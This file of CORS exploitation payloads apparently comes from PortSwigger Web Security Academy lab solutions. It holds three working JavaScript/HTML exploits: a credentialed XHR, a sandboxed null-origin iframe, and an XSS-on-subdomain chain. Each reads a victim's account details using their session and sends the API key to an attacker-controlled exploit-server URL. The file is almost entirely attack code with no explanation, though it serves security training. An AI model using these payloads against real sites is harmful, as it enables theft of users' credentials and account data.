//Cors

//Basic Cors; gets the apikey
function getadmin() {
    var res = JSON.parse(this.response)
    fetch("https://YOUR-EXPLOIT-LAB-ID.web-security-academy.net/accountdetails?" + res.apikey);
}

const request = new XMLHttpRequest();
request.addEventListener("load", getadmin);
request.open("GET", "https://YOUR-LAB-ID.web-security-academy.net/accountdetails", true);
request.withCredentials = true;
request.send();

// If null origin is Whitelisted; gets the apikey
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountdetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
var res = JSON.parse(this.response)
location = 'https://YOUR-EXPLOIT-LAB-ID.web-security-academy.net/accountdetails?' + res.apikey;
};
</script>"></iframe>

// CORS vulnerability with trusted insecure protocols

<script>
    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {var res = JSON.parse(this.response); location='https://YOUR-EXPLOIT-LAB-ID.web-security-academy.net/accountDetails?data='%2bres.apikey; };%3c/script>&storeId=1"
</script>
